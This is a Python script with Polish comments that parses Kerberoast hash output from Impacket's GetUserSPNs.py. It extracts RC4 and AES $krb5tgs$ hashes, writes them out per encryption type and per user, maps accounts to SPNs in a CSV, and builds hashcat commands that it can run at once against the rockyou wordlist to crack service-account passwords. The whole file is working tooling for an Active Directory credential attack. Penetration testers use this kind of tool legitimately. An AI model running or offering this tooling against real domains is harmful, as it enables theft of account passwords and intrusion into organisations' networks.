#!/usr/bin/env python3
"""
Usage:
    python3 kerbparse.py roast_raw.txt
    python3 kerbparse.py roast_raw.txt -o wyniki/ --csv
    python3 kerbparse.py roast_raw.txt --run --wordlist /usr/share/wordlists/rockyou.txt
    cat roast_raw.txt | python3 kerbparse.py -
"""

import argparse
import csv
import os
import re
import shutil
import subprocess
import sys

# --- Formaty hashy Impacketa roznia sie miedzy RC4 a AES! -------------------
# RC4  (etype 23): $krb5tgs$23$*user$REALM$spn*$checksum$edata
# AES  (etype 17/18): $krb5tgs$17$user$REALM$*spn*$checksum$edata
#                                ^ gwiazdki obejmuja tylko SPN
RC4_RE = re.compile(
    r"\$krb5tgs\$(?P<etype>23)\$\*"
    r"(?P<user>[^$*]+)\$(?P<realm>[^$*]+)\$(?P<spn>[^*]*)"
    r"\*\$(?P<checksum>[0-9a-fA-F]+)\$(?P<edata>[0-9a-fA-F]+)"
)
AES_RE = re.compile(
    r"\$krb5tgs\$(?P<etype>1[78])\$"
    r"(?P<user>[^$*]+)\$(?P<realm>[^$*]+)\$\*(?P<spn>[^*]*)\*"
    r"\$(?P<checksum>[0-9a-fA-F]+)\$(?P<edata>[0-9a-fA-F]+)"
)
# Zgrubny lapacz - uzywany do wyciecia surowego stringa niezaleznie od wariantu.
ANY_RE = re.compile(r"\$krb5tgs\$\d{1,2}\$\S+")

# Znaki, ktore moga wystapic w zawinietej kontynuacji hasha.
CONT_RE = re.compile(r"^[0-9a-fA-F$*/@._:\-]+$")

HASHCAT_MODES = {"23": 13100, "17": 19600, "18": 19700}
MODE_LABEL = {"23": "RC4-HMAC", "17": "AES128", "18": "AES256"}


def unwrap(text):
    """Skleja hashe polamane przez zawijanie wierszy w terminalu.

    Kontynuacja hasha to linia zlozona wylacznie ze znakow hex/separatorow -
    wiersze tabeli GetUserSPNs zawsze zawieraja spacje, wiec sie nie zlapia.
    """
    out = []
    buf = None
    for raw in text.splitlines():
        line = raw.strip()
        if "$krb5tgs$" in line:
            if buf is not None:
                out.append(buf)
            buf = line
            continue
        if buf is not None:
            if line and len(line) >= 8 and CONT_RE.match(line):
                buf += line
                continue
            out.append(buf)
            buf = None
        out.append(line)
    if buf is not None:
        out.append(buf)
    return "\n".join(out)


def parse(text):
    """Zwraca liste slownikow z metadanymi + surowym hashem, bez duplikatow."""
    found, seen = [], set()
    for m in ANY_RE.finditer(unwrap(text)):
        h = m.group(0).rstrip(".,;")
        meta = RC4_RE.match(h) or AES_RE.match(h)
        if not meta:
            print(f"[!] Pominieto nierozpoznany fragment: {h[:60]}...", file=sys.stderr)
            continue
        # Przycinamy do dokladnego dopasowania - obcina ewentualne smieci z konca.
        h = meta.group(0)
        if h in seen:
            continue
        seen.add(h)
        d = meta.groupdict()
        d["hash"] = h
        found.append(d)
    return found


def main():
    ap = argparse.ArgumentParser(
        description="Parser hashy Kerberoast z outputu GetUserSPNs.py"
    )
    ap.add_argument("infile", help="plik z surowym outputem ('-' = stdin)")
    ap.add_argument("-o", "--outdir", default="kerb_out", help="katalog wyjsciowy")
    ap.add_argument("--csv", action="store_true", help="zapisz tez mape user/SPN do CSV")
    ap.add_argument("--split-user", action="store_true",
                    help="dodatkowo zapisz osobny plik na kazdego uzytkownika")
    ap.add_argument("--run", action="store_true", help="odpal hashcata od razu")
    ap.add_argument("--wordlist", default="/usr/share/wordlists/rockyou.txt")
    ap.add_argument("--rules", help="sciezka do pliku regul, np. .../rules/best64.rule")
    ap.add_argument("--hashcat", default="hashcat", help="binarka hashcata")
    args = ap.parse_args()

    text = sys.stdin.read() if args.infile == "-" else open(
        args.infile, encoding="utf-8", errors="replace").read()

    entries = parse(text)
    if not entries:
        print("[-] Nie znalazlem zadnego hasha $krb5tgs$ w wejsciu.", file=sys.stderr)
        return 1

    os.makedirs(args.outdir, exist_ok=True)

    # Grupowanie po etype - hashcat przyjmuje jeden tryb na uruchomienie.
    by_etype = {}
    for e in entries:
        by_etype.setdefault(e["etype"], []).append(e)

    print(f"[+] Znaleziono {len(entries)} unikalnych hashy "
          f"({len(set(e['user'] for e in entries))} kont)\n")

    files = []
    for etype, items in sorted(by_etype.items()):
        path = os.path.join(args.outdir, f"krb5tgs_{etype}.txt")
        with open(path, "w") as f:
            f.write("\n".join(i["hash"] for i in items) + "\n")
        mode = HASHCAT_MODES.get(etype)
        files.append((path, mode, etype, len(items)))
        print(f"    {MODE_LABEL.get(etype, '?'):9s} etype {etype}  "
              f"-> {len(items):3d} szt.  {path}")

    if args.split_user:
        udir = os.path.join(args.outdir, "per_user")
        os.makedirs(udir, exist_ok=True)
        for e in entries:
            safe = re.sub(r"[^A-Za-z0-9._-]", "_", e["user"])
            with open(os.path.join(udir, f"{safe}.txt"), "a") as f:
                f.write(e["hash"] + "\n")

    if args.csv:
        cpath = os.path.join(args.outdir, "spn_map.csv")
        with open(cpath, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["user", "realm", "spn", "etype", "encryption"])
            for e in sorted(entries, key=lambda x: x["user"].lower()):
                w.writerow([e["user"], e["realm"], e["spn"], e["etype"],
                            MODE_LABEL.get(e["etype"], "?")])
        print(f"\n[+] Mapa kont/SPN: {cpath}")

    pot = os.path.join(args.outdir, "cracked.txt")
    print("\n--- Komendy hashcata " + "-" * 40)
    cmds = []
    for path, mode, etype, n in files:
        if mode is None:
            print(f"[!] Nieznany etype {etype} - brak mapowania na tryb hashcata")
            continue
        cmd = [args.hashcat, "-m", str(mode), "-a", "0", "-w", "3",
               path, args.wordlist, "--outfile", pot, "--outfile-format", "2"]
        if args.rules:
            cmd += ["-r", args.rules]
        cmds.append(cmd)
        print(" ".join(cmd))
    print("-" * 60)

    if args.run:
        if not shutil.which(args.hashcat):
            print(f"\n[-] Nie znalazlem '{args.hashcat}' w PATH.", file=sys.stderr)
            return 1
        if not os.path.exists(args.wordlist):
            print(f"\n[-] Brak slownika: {args.wordlist}", file=sys.stderr)
            print("    rockyou bywa spakowany: gunzip /usr/share/wordlists/rockyou.txt.gz",
                  file=sys.stderr)
            return 1
        for cmd in cmds:
            print(f"\n[*] Uruchamiam: {' '.join(cmd)}\n")
            # Kod 1 = wyczerpano slownik bez trafien, to nie blad.
            rc = subprocess.call(cmd)
            if rc not in (0, 1):
                print(f"[!] hashcat zakonczyl sie kodem {rc}", file=sys.stderr)
        if os.path.exists(pot):
            print(f"\n[+] Zlamane hasla: {pot}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
